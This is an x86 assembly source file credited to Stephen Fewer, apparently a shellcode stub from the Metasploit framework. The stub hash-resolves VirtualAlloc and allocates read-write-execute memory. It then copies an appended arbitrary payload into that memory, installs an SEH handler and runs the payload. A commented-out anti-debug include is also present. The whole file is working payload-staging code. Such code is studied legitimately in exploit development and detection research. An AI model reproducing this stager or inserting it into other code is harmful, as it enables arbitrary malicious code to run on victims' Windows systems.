;-----------------------------------------------------------------------------;
; Author: (mostly) Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (31 October 2009)
; Size:
; Build: >build.py wrapped_jmp
;-----------------------------------------------------------------------------;

[BITS 32]
[ORG 0]

; Disabled until this is better tested
; %include "./src/block/block_antidebug.asm"

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ;
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.

allocate_size:
   mov esi,0x12345678

allocate:
  push byte 0x40         ; PAGE_EXECUTE_READWRITE
  push 0x1000            ; MEM_COMMIT
  push esi               ; Push the length value of the wrapped code block
  push byte 0            ; NULL as we dont care where the allocation is.
  push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
  call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

  mov ebx, eax           ; Store allocated address in ebx
  mov edi, eax           ; Prepare EDI with the new address
  mov ecx, esi           ; Prepare ECX with the length of the code
  call get_payload
got_payload:
  pop esi                ; Prepare ESI with the source to copy
  rep movsb              ; Copy the payload to RWX memory
  call set_handler       ; Configure error handling

exitblock:
%include "./src/block/block_exitfunk.asm"
set_handler:
  xor eax,eax
  push dword [fs:eax]
  mov dword [fs:eax], esp
  call ebx
  jmp short exitblock

get_payload:
  call got_payload
payload:
; Append an arbitary payload here

